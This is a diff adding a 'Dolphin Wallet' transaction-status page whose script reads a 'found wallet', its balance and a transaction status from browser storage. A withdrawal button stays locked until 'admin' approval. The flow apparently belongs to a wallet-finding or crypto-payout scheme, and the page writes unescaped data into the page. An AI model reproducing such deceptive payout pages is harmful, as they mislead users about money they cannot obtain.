@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Transaction Status - Dolphin Wallet</title>
+  <link rel="stylesheet" href="../assets/style-neon.css" />
+  <style>
+    body {
+      background: radial-gradient(ellipse at center, #000010, #000);
+      font-family: 'Orbitron', sans-serif;
+      color: #0ff;
+      margin: 0;
+      padding: 40px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .box {
+      background: rgba(0, 10, 20, 0.85);
+      padding: 40px;
+      border-radius: 18px;
+      box-shadow: 0 0 30px #0ff4, inset 0 0 20px #0ff3;
+      max-width: 700px;
+      width: 100%;
+    }
+    .status {
+      font-size: 1.3em;
+      margin: 20px 0;
+    }
+    .hash, .wallet-info {
+      font-family: monospace;
+      background: #000;
+      padding: 10px;
+      border: 1px dashed #0ff8;
+      border-radius: 8px;
+      margin-top: 15px;
+      word-break: break-word;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 20px 0 10px;
+      font-family: monospace;
+      background: #000;
+      color: #0ff;
+      border: 1px solid #0ff6;
+      border-radius: 6px;
+    }
+    .btn {
+      padding: 12px 24px;
+      font-size: 1em;
+      color: #000;
+      background: #0ff;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    .btn[disabled] {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+    .btn:hover:not([disabled]) {
+      background: #00faff;
+      box-shadow: 0 0 12px #0ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>Transaction Submitted ✅</h1>
+    <div class="status" id="statusText">⏳ Awaiting admin confirmation...</div>
+    <div class="hash" id="txHash">Loading...</div>
+
+    <h2>🔐 Wallet Information</h2>
+    <div class="wallet-info" id="walletInfo">Loading wallet data...</div>
+
+    <p>Please enter your personal wallet address to receive assets:</p>
+    <input class="input-field" id="userWallet" placeholder="e.g. your own BTC or ETH address" />
+    <button class="btn" id="withdrawBtn" disabled onclick="requestWithdraw()">💸 Request Withdrawal</button>
+    <p style="font-size: 0.9em; color: #aff; margin-top: 10px;">
+      This button will be enabled once your transaction is approved by admin.
+    </p>
+  </div>
+
+  <script>
+    const txHash = localStorage.getItem("final_tx") || "N/A";
+    const status = localStorage.getItem("final_tx_status") || "pending";
+    const wallet = JSON.parse(localStorage.getItem("found_wallet") || "{}");
+
+    document.getElementById("txHash").innerText = txHash;
+
+    const maskedAddress = wallet.address ? wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4) : 'N/A';
+
+    if (status.toLowerCase() === "approved") {
+      document.getElementById("statusText").innerHTML = "✅ Transaction Approved! You can now request withdrawal.";
+      document.getElementById("withdrawBtn").disabled = false;
+    } else {
+      document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
+    }
+
+    document.getElementById("walletInfo").innerHTML = `
+      <strong>Address:</strong> ${maskedAddress}<br>
+      <strong>Balance:</strong> ${wallet.balance || 'N/A'}<br>
+      <strong>Network:</strong> ${wallet.network || 'N/A'}<br>
+      <strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
+    `;
+
+    function requestWithdraw() {
+      const userAddr = document.getElementById("userWallet").value.trim();
+      if (!userAddr) {
+        alert("Please enter your personal wallet address.");
+        return;
+      }
+      localStorage.setItem("withdraw_to", userAddr);
+      alert("✅ Withdrawal request submitted!");
+    }
+  </script>
+</body>
+</html>
